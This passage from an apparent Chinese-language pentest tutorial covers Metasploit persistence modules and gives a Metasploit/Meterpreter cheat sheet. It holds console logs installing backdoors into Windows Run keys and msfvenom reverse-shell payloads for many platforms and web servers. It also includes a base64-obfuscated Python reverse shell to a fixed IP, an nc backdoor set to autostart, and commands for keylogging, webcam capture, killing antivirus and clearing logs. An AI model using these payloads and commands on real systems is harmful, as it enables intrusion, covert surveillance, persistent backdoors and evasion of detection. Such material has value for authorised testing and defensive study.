HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua</span><br></pre></td></tr></table></figure>

能实现同样功能的脚本还有：exploit/windows/local/persistence2.metsvc服务后门在C:\Users<em><strong>\AppData\Local\Temp\目录下，上传一个vbs脚本<br>在注册表HKLM\Software\Microsoft\Windows\CurrentVersion\Run\加入开机启动项。</strong>通过服务启动，需要管理员权限，官方不推荐使用，运行失败</em>*<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">run metsvc –A   #自动安装后门</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run metsvc –A</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Creating a meterpreter service on port 31337</span><br><span class="line">[*] Creating a temporary installation directory C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH...</span><br><span class="line">[*]  &gt;&gt; Uploading metsrv.x86.dll...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc-server.exe...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc.exe...</span><br><span class="line">[*] Starting the service...</span><br><span class="line">    Cannot open service manager (0x00000005)</span><br><span class="line"></span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH</span><br><span class="line">========================================================</span><br><span class="line"></span><br><span class="line">Mode              Size    Type  Last modified              Name</span><br><span class="line">----              ----    ----  -------------              ----</span><br><span class="line">100666/rw-rw-rw-  178688  fil   2019-06-12 06:46:20 -0700  metsrv.dll</span><br><span class="line">100777/rwxrwxrwx  45056   fil   2019-06-12 06:46:21 -0700  metsvc-server.exe</span><br><span class="line">100777/rwxrwxrwx  61440   fil   2019-06-12 06:46:21 -0700  metsvc.exe</span><br></pre></td></tr></table></figure>

三个文件上传成功，但服务没有启动起来，失败了。使用<code>-r</code>参数可卸载服务。3.persistence_exe再来看看官方推荐的东西吧<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; info post/windows/manage/persistence_exe</span><br><span class="line"></span><br><span class="line">       Name: Windows Manage Persistent EXE Payload Installer</span><br><span class="line">     Module: post/windows/manage/persistence_exe</span><br><span class="line">   Platform: Windows</span><br><span class="line">       Arch: </span><br><span class="line">       Rank: Normal</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  Merlyn drforbin Cousins &lt;drforbin6@gmail.com&gt;</span><br><span class="line"></span><br><span class="line">Compatible session types:</span><br><span class="line">  Meterpreter</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name      Current Setting  Required  Description</span><br><span class="line">  ----      ---------------  --------  -----------</span><br><span class="line">  REXENAME  default.exe      yes       The name to call exe on remote system</span><br><span class="line">  REXEPATH                   yes       The remote executable to upload and execute.</span><br><span class="line">  SESSION                    yes       The session to run this module on.</span><br><span class="line">  STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This Module will upload an executable to a remote host and make it </span><br><span class="line">  Persistent. It can be installed as USER, SYSTEM, or SERVICE. USER </span><br><span class="line">  will start on user login, SYSTEM will start on system boot but </span><br><span class="line">  requires privs. SERVICE will create a new service which will start </span><br><span class="line">  the payload. Again requires privs.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Module options (post/windows/manage/persistence_exe):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   REXENAME  default.exe      yes       The name to call exe on remote system</span><br><span class="line">   REXEPATH                   yes       The remote executable to upload and execute.</span><br><span class="line">   SESSION                    yes       The session to run this module on.</span><br><span class="line">   STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)</span><br></pre></td></tr></table></figure>

此模块将可执行文件上载到远程主机并进行创建持久性。<br>涉及到四个参数<ul>
<li>REXENAME是拷贝到目标系统中的名字</li>
<li>EXEPATH是将要上传的后门在本地的位置</li>
<li>SESSION是选择运行此模块的会话</li>
<li>STARTUP是启动类型，有USER、SYSTEM、SERVICE这三种取值，USER表示为将在用户登录时启动，SYSTEM表示将在系统启动时启动(需要权限)，SERVICE表示将创建一个启动服务项(需要权限)。</li>
</ul>
尝试一下：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/manage/persistence_exe REXENAME=backdoor.exe REXEPATH=/home/ubuntu/shell.exe STARTUP=USER</span><br><span class="line"></span><br><span class="line">[*] Running module against SAUCERMAN</span><br><span class="line">[*] Reading Payload from file /home/ubuntu/shell.exe</span><br><span class="line">[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\backdoor.exe</span><br><span class="line">[*] Executing script C:\Users\TideSec\AppData\Local\Temp\backdoor.exe</span><br><span class="line">[+] Agent executed with PID 3684</span><br><span class="line">[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI</span><br><span class="line">[+] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI</span><br><span class="line">[*] Cleanup Meterpreter RC File: /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.1023/SAUCERMAN_20190612.1023.rc</span><br></pre></td></tr></table></figure>

4.registry_persistence完整路径为exploit/windows/local/registry_persistence和第一种方法类似，此模块将会安装一个payload到注册表的启动项中。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 13...</span><br><span class="line">msf5 auxiliary(server/socks5) &gt; use exploit/windows/local/registry_persistence</span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/registry_persistence):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   BLOB_REG_KEY                    no        The registry key to use for storing the payload blob. (Default: random)</span><br><span class="line">   BLOB_REG_NAME                   no        The name to use for storing the payload blob. (Default: random)</span><br><span class="line">   CREATE_RC      true             no        Create a resource file for cleanup</span><br><span class="line">   RUN_NAME                        no        The name to use for the &#x27;Run&#x27; key. (Default: random)</span><br><span class="line">   SESSION                         yes       The session to run this module on.</span><br><span class="line">   SLEEP_TIME     0                no        Amount of time to sleep (in seconds) before executing payload. (Default: 0)</span><br><span class="line">   STARTUP        USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; set SESSION 13</span><br><span class="line">SESSION =&gt; 13</span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Generating payload blob..</span><br><span class="line">[+] Generated payload, 6048 bytes</span><br><span class="line">[*] Root path is HKCU</span><br><span class="line">[*] Installing payload blob..</span><br><span class="line">[+] Created registry key HKCU\Software\0BaG3zDR</span><br><span class="line">[+] Installed payload blob to HKCU\Software\0BaG3zDR\iiEB4InD</span><br><span class="line">[*] Installing run key</span><br><span class="line">[+] Installed run key HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SMPqA5kB</span><br><span class="line">[*] Clean up Meterpreter RC file: /home/ubuntu/.msf4/logs/persistence/192.168.81.154_20190612.2138/192.168.81.154_20190612.2138.rc</span><br></pre></td></tr></table></figure>

同类型的还有其他payload，如exploit/windows/local/vss_persistence，exploit/windows/local/s4u_persistence。<h2 id="参考-3"><a href="#参考-3" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2536">https://xz.aliyun.com/t/2536</a></li>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/164525">https://www.anquanke.com/post/id/164525</a></li>
<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/118714.html">访问的文章审核中… - FreeBuf网络安全行业门户</a>## 1. 安装运行及初始化安装<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 安装</span><br><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall</span><br><span class="line"></span><br><span class="line"># 安装完成后位置</span><br><span class="line"># /opt/metasploit-framework/embedded/framework/</span><br><span class="line"></span><br><span class="line"># 目录结构 </span><br><span class="line">--modules 重点看这里就行了</span><br><span class="line">  --auxiliary 主要包含辅助性脚本(扫描、嗅探、注入、爆破，漏洞挖掘)</span><br><span class="line">  --encoders 主要包含各种编码工具，以便绕过入侵检测和过滤系统</span><br><span class="line">  --exploits 漏洞利用，包含主流的漏洞利用脚本，exp命名规则:系统/服务/模块</span><br><span class="line">  --nops 绕过针对溢出攻击滑行字符串的拦截检测</span><br><span class="line">  --payloads 攻击荷载，主要在目标机器执行代码</span><br><span class="line">  --post 此目录放着msf的exploit执行成功后，向目标发送的一些功能性指令，如提权，获取hash等</span><br><span class="line">  --evasion 新增，用来生成免杀payload，类似于集成msfvenom功能</span><br><span class="line">--data 放了meterpreter ，passiveX，vnc，DLLs，等这些工具和一些用户接口代码，msfweb 和一些其他模块用到的数据文件</span><br><span class="line">--plugins 这里的模块用户需要load来加载，提供数据库连接插件和各种要用到的插件</span><br><span class="line">--scripts 这个目录下的文件大都是meterpreter这个模块利用的脚本，比如用到migrate来转移到其他进程的指令的源代码就在此</span><br><span class="line">--tools 包含一些有用的脚本和零散的工具</span><br></pre></td></tr></table></figure>

启动<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 运行</span><br><span class="line">$ msfconsole</span><br><span class="line"># 初始化数据库</span><br><span class="line">$ msfdb init</span><br><span class="line"># 重建缓存</span><br><span class="line">$ db_rebuild_cache</span><br><span class="line"># 查看数据库连接情况</span><br><span class="line">$ db_status</span><br></pre></td></tr></table></figure>

<h2 id="2-msf基本命令-4"><a href="#2-msf基本命令-4" class="headerlink" title="2. msf基本命令"></a>2. msf基本命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">show exploits – 查看所有可用的渗透攻击程序代码 </span><br><span class="line">show auxiliary – 查看所有可用的辅助攻击工具 </span><br><span class="line">show options – 查看该模块所有可用选项 </span><br><span class="line">show payloads – 查看该模块适用的所有载荷代码 </span><br><span class="line">show targets – 查看该模块适用的攻击目标类型</span><br><span class="line">search – 根据关键字搜索某模块 </span><br><span class="line">info – 显示某模块的详细信息 </span><br><span class="line">use – 进入使用某渗透攻击模块 </span><br><span class="line">back – 回退 </span><br><span class="line">set/unset – 设置/禁用模块中的某个参数 </span><br><span class="line">setg/unsetg – 设置/禁用适用于所有模块的全局参数 </span><br><span class="line">save – 将当前设置值保存下来，以便下次启动MSF终端时仍可使用</span><br></pre></td></tr></table></figure>

<h2 id="3-msfvenom生成payload-4"><a href="#3-msfvenom生成payload-4" class="headerlink" title="3 msfvenom生成payload"></a>3 msfvenom生成payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-p, --payload    &lt;payload&gt;       指定需要使用的payload(攻击荷载)</span><br><span class="line">-l, --list       [module_type]   列出指定模块的所有可用资源,模块类型包括: payloads, encoders, nops, all</span><br><span class="line">-n, --nopsled    &lt;length&gt;        为payload预先指定一个NOP滑动长度</span><br><span class="line">-f, --format     &lt;format&gt;        指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)</span><br><span class="line">-e, --encoder    [encoder]       指定需要使用的encoder（编码器）</span><br><span class="line">-a, --arch       &lt;architecture&gt;  指定payload的目标架构</span><br><span class="line">    --platform   &lt;platform&gt;      指定payload的目标平台</span><br><span class="line">-s, --space      &lt;length&gt;        设定有效攻击荷载的最大长度</span><br><span class="line">-b, --bad-chars  &lt;list&gt;          设定规避字符集，比如: &amp;#039;\x00\xff&amp;#039;</span><br><span class="line">-i, --iterations &lt;count&gt;         指定payload的编码次数</span><br><span class="line">-c, --add-code   &lt;path&gt;          指定一个附加的win32 shellcode文件</span><br><span class="line">-x, --template   &lt;path&gt;          指定一个自定义的可执行文件作为模板</span><br><span class="line">-k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行</span><br><span class="line">    --payload-options            列举payload的标准选项</span><br><span class="line">-o, --out   &lt;path&gt;               保存payload</span><br><span class="line">-v, --var-name &lt;name&gt;            指定一个自定义的变量，以确定输出格式</span><br><span class="line">    --shellest                   最小化生成payload</span><br><span class="line">-h, --help                       查看帮助选项</span><br><span class="line">    --help-formats               查看msf支持的输出格式列表</span><br></pre></td></tr></table></figure>

1.可执行程序Linux<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">反向连接：</span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br><span class="line">正向连接：</span><br><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp LHOST=&lt;Target IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>

Windows<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>

Mac<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure>

执行方式：直接复制可执行程序到目标机器上执行就行了。2.Web PayloadsPHP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo &#x27;&lt;?php &#x27; | tr -d &#x27;\n&#x27; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>

ASP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure>

JSP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure>

WAR<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</span><br></pre></td></tr></table></figure>

执行方式：将shell.php放在web目录下，使用浏览器访问，或者使用以下命令执行：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php shell.php</span><br></pre></td></tr></table></figure>

3.脚本shellPython<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br></pre></td></tr></table></figure>

Bash<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure>

Perl<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure>

执行方式：复制shell.py中的内容在linux命令行下执行：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;exec(&#x27;aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zICAgICAgOyAgICBob3N0PSIxOTIuMTY4Ljg4LjEyOCIgICAgICA7ICAgIHBvcnQ9NDQ0NCAgICAgIDsgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkgICAgICA7ICAgIHMuY29ubmVjdCgoaG9zdCxwb3J0KSkgICAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSwwKSAgICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpLDEpICAgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCksMikgICAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ==&#x27;.decode(&#x27;base64&#x27;))&quot;</span><br></pre></td></tr></table></figure>

4.shellcode<br>Linux Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>

Windows Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>

Mac Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>

<h2 id="4-Meterpreter基本命令-4"><a href="#4-Meterpreter基本命令-4" class="headerlink" title="4. Meterpreter基本命令"></a>4. Meterpreter基本命令</h2>首先需要先获取meterpreter：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.81.160</span><br><span class="line">set ExitOnSession false</span><br><span class="line">exploit -j -z # -j(计划任务下进行攻击，后台) -z(攻击完成不遇会话交互)</span><br><span class="line">jobs  # 查看后台攻击任务 </span><br><span class="line">kill &lt;id&gt;  # 停止某后台攻击任务 </span><br><span class="line">sessions -l  # (查看会话)</span><br><span class="line">sessions -i 2   # 选择会话</span><br><span class="line">sessions -k 2   # 结束会话</span><br></pre></td></tr></table></figure>

如果先获取了cmd，比如利用ms17-010，默认使用的payload返回的就是cmd。这时候我们可以使用<code>sessions-u 2</code>来将cmdshell升级成meterpreter。获取到了meterpreter，就可以进行后渗透了。<h3 id="4-1-基本系统命令-4"><a href="#4-1-基本系统命令-4" class="headerlink" title="4.1 基本系统命令"></a>4.1 基本系统命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"># 会话管理</span><br><span class="line">background  #将当前会话放置后台</span><br><span class="line">sessions  # 查看会话</span><br><span class="line">sessions -i  # 切换会话</span><br><span class="line">quit  # 关闭当前的会话，返回msf终端</span><br><span class="line"></span><br><span class="line"># 系统设置</span><br><span class="line">sysinfo  # 查看目标机系统信息</span><br><span class="line">idletime  # 查看目标机闲置时间</span><br><span class="line">reboot/shutdown   # 重启/关机</span><br><span class="line"></span><br><span class="line"># shell</span><br><span class="line">shell  # 获得控制台权限</span><br><span class="line">irb  # 进入ruby终端</span><br><span class="line"></span><br><span class="line"># 进程迁移</span><br><span class="line">getpid    # 获取当前进程的pid</span><br><span class="line">ps   # 查看当前活跃进程</span><br><span class="line">migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中</span><br><span class="line">kill &lt;pid值&gt;   #杀死进程</span><br><span class="line">migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中</span><br><span class="line"></span><br><span class="line"># 执行文件</span><br><span class="line">execute #在目标机中执行文件</span><br><span class="line">execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互</span><br><span class="line"></span><br><span class="line"># 摄像头命令</span><br><span class="line">webcam_list  #查看摄像头列表</span><br><span class="line">webcam_chat  # 查看摄像头接口</span><br><span class="line">webcam_snap   #通过摄像头拍照</span><br><span class="line">webcam_stream   #通过摄像头开启视频</span><br><span class="line"></span><br><span class="line"># uictl开关键盘/鼠标</span><br><span class="line">uictl [enable/disable] [keyboard/mouse/all]  #开启或禁止键盘/鼠标</span><br><span class="line">uictl disable mouse  #禁用鼠标</span><br><span class="line">uictl disable keyboard  #禁用键盘</span><br><span class="line"></span><br><span class="line"># 远程桌面/截屏</span><br><span class="line">enumdesktops  #查看可用的桌面</span><br><span class="line">getdesktop    #获取当前meterpreter 关联的桌面</span><br><span class="line">screenshot  #截屏</span><br><span class="line">use espia  #或者使用espia模块截屏  然后输入screengrab</span><br><span class="line">run vnc  #使用vnc远程桌面连接</span><br><span class="line"></span><br><span class="line"># 键盘记录</span><br><span class="line">keyscan_start  #开始键盘记录</span><br><span class="line">keyscan_dump   #导出记录数据</span><br><span class="line">keyscan_stop #结束键盘记录</span><br><span class="line"></span><br><span class="line"># 添加用户，开启远程桌面</span><br><span class="line"># 开启rdp是通过reg修改注册表；添加用户是调用cmd.exe 通过net user添加；端口转发是利用的portfwd命令</span><br><span class="line">run post/windows/manage/enable_rdp  #开启远程桌面</span><br><span class="line">run post/windows/manage/enable_rdp USERNAME=www2 PASSWORD=123456 #添加用户</span><br><span class="line">run post/windows/manage/enable_rdp FORWARD=true LPORT=6662  #将3389端口转发到6662</span><br><span class="line"></span><br><span class="line"># 关闭防病毒软件</span><br><span class="line">run killav</span><br><span class="line">run post/windows/manage/killav</span><br><span class="line"></span><br><span class="line"># 修改注册表</span><br><span class="line">reg –h # 注册表命令帮助</span><br><span class="line">upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32 #上传nc</span><br><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #枚举run下的key</span><br><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d &#x27;C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe&#x27; #设置键值</span><br><span class="line">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc   #查看键值</span><br><span class="line">nc -v 192.168.81.162 443  #攻击者连接nc后门</span><br><span class="line"></span><br><span class="line"># 清理日志</span><br><span class="line">clearav  #清除windows中的应用程序日志、系统日志、安全日志</span><br></pre></td></tr></table></figure>

